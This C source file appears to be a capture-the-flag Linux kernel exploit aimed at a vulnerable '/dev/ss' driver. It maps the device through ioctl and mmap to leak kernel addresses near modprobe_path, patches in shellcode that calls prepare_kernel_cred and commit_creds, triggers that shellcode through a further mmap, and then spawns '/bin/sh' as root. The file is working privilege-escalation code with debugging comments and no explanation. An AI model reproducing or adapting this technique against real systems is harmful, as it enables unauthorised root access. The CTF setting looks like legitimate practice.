int _main(int argc, char const *argv[]);
int main(int argc, char const *argv[])
{
	return _main(argc, argv);
}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <assert.h>
#include <x86intrin.h>
#include <errno.h>
#include <sys/wait.h>


/*
1. cat /proc/kallsyms | grep cleanup_module
2. x/10i, x/10gx
3. address of release is base address

mmap: b *+0x815
fault: b *+0x3e0
mmap_buffer: +0x669
*/

unsigned char sc[] =
{72,184,65,65,65,65,65,65,65,65,72,49,255,255,208,72,137,199,72,184,66,66,66,66,66,66,66,66,255,208,184,255,255,255,255,195}
;

void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

void replace_sc(uintptr_t prepare_kernel_cred, uintptr_t commit_creds)
{
	for (int i = 0; i < sizeof(sc); ++i)
	{
		if (*(uintptr_t*)(sc + i) == 0x4141414141414141)
			*(uintptr_t*)(sc + i) = prepare_kernel_cred;
		if (*(uintptr_t*)(sc + i) == 0x4242424242424242)
			*(uintptr_t*)(sc + i) = commit_creds;
	}
}

#define NOTE_SIZE 0x10000
int _main(int argc, char const *argv[])
{
	int fd, fd2, fd3;
	// puts("Hello from exp3");
	if (argc == 2)
	{
		fd = open("/dev/ss", 2);
		fd2 = open("/dev/ss", 2);
		fd3 = open("/dev/ss", 2);
	}
	else
	{
		fd2 = 3;
		fd = 6;
		fd3 = 7;
	}
	// system("ls -al /proc/self/fd");
	// we see which fd is /dev/ss by this command easily
	ioctl(fd, 0, 0xf);
	char* p2 = mmap(NULL, NOTE_SIZE, PROT_READ | PROT_WRITE, 1, fd, 0);
	if (p2 == MAP_FAILED)
		errExit("p2 mmap failed");
	else
		puts("p2 mmap sucess");
	memset(p2 + 0x1000, 0xff, NOTE_SIZE - 0x1000);
	munmap(p2, NOTE_SIZE);
	close(fd);

	ioctl(fd2, 0, 0);
	uintptr_t* p = mmap(NULL, 0x100000000uL, PROT_READ | PROT_WRITE, 1, fd2, 0);
	if (p == MAP_FAILED)
		errExit("p mmap failed");
	else
		puts("p mmap sucess");

	// for (size_t i = 0; i < 0x1000 / 8; ++i)
	// {
	// 	size_t idx = 0x100000000uL/8u - 0x1000u/8u*4u + i;
	// 	if (p[idx] != 0)
	// 		printf("0x%lx: 0x%lx\n", i * 8, p[idx]);
	// 	// if ((p[idx] & 0xfff) == 0x390)
	// 	// {
	// 	// }
	// 	// p[idx] = p[idx] + 1;
	// }
	uintptr_t modprobe_addr = p[0x100000000uL/8u - 0x1000u/8u*2u + 0x5f0 / 8] - 1704704;
	uintptr_t mmap_buffer = p[0x100000000uL/8u - 0x1000u/8u + 0x30 / 8] - 0x30 + 0x1000;
	printf("0x%lx 0x%lx 0x%lx\n", modprobe_addr, mmap_buffer, mmap_buffer - modprobe_addr);
	assert(mmap_buffer > modprobe_addr);
	char* fault_addr = ((char*)p) + 0x100000000uL - 0x4000 + 0x7e0;
	replace_sc(modprobe_addr-22652528, modprobe_addr-22653424);
	memcpy(fault_addr, sc, 0x846-0x7e0); // write shellcode
	// getchar();
	mmap(NULL, NOTE_SIZE, PROT_READ | PROT_WRITE, 1, fd3, 0); // call mmap to execute shelcode
	system("/bin/sh");
	return 0;
	// this approach fails because vmalloc_to_page returns NULL
	// uintptr_t ptr = ((uintptr_t)p) + 0x100000000uL - (mmap_buffer - modprobe_addr);
	// ptr &= 0xffffffffff000000uL;
	// puts((char*)ptr);
}